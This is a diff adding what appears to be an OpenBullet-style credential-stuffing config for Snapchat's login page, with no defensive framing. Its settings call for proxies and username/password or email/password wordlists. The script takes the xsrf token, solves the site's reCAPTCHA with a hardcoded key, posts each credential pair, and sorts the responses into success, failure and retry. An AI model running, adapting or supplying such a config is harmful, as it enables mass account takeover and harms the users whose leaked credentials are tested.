@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "Snapchat",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-08T00:54:19.3314238+00:00",
+  "AdditionalInfo": "",
+  "Author": "Choempie",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET REQUEST GET "https://accounts.snapchat.com/accounts/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_TOKEN PARSE "<SOURCE>" LR "xsrf=\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+RECAPTCHA "https://accounts.snapchat.com/accounts/login" "6LdENzEUAAAAAMud35tItKpnCdOuZxblLIPOo9uw" -> VAR "RCP" 
+#POST_LOGIN REQUEST POST "https://accounts.snapchat.com/accounts/login" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&xsrf_token=<TOKEN>&continue=%2Faccounts%2Fwelcome&g-recaptcha-response=<RCP>&g-recaptcha-response=<RCP>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "xsrf_token: <TOKEN>" 
+  COOKIE " sc-cookies-popup-dismissed: true" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://accounts.snapchat.com/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Retry OR 
+    KEY "Unable to verify captcha" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "302" 
+    KEY "geofilters" 
+  KEYCHAIN Failure OR 
+    KEY "Cannot find the user" 
+    KEY "not the right password" 
